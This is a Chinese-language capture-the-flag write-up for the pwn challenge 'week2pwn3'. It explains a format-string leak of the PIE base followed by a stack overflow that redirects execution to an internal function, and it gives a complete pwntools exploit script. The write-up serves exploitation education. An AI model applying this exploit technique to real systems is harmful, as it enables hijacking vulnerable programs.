# week2pwn3

## 题目简述

程序启用 PIE，并先把用户名直接作为格式串输出，随后存在栈溢出。利用格式串泄漏主程序代码指针以恢复 PIE 基址，再覆盖返回地址跳转到程序内的目标函数。

## 解题过程

第 15 个格式化参数泄漏的是主程序内偏移 `0x130d` 的返回地址，因此 `leak - 0x130d` 即为 PIE 基址。第二次输入的缓冲区为 `0x80` 字节，越过保存的 `rbp` 后返回地址偏移为 `0x88`，目标函数相对基址偏移为 `0x1233`：

~~~python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
s = remote('HOST', PORT)
payload = b'%15$p'
s.sendlineafter(b"what's your name?\n", payload)
elf_base = int(s.recv(14), 16) - 0x130D
success('elf_base=>' + hex(elf_base))
payload = b'a' * 0x80 + b'b' * 0x8 + p64(elf_base + 0x1233)
s.sendlineafter(b"do you know how to getshell?\n", payload)
s.interactive()
~~~

两个偏移均来自同一份二进制，不受 ASLR 影响；每次运行只需要重新获取基址。

## 方法总结

- 核心方法：用格式串泄漏 PIE 内地址，换算模块基址后完成 ret2text。
- 识别特征：第一次输入有格式串漏洞，第二次输入可覆盖返回地址，且目标函数位于主程序内部。
- 注意事项：不能把泄漏值直接当目标地址；应先确认它对应的静态偏移，并在远程与本地二进制一致时使用。
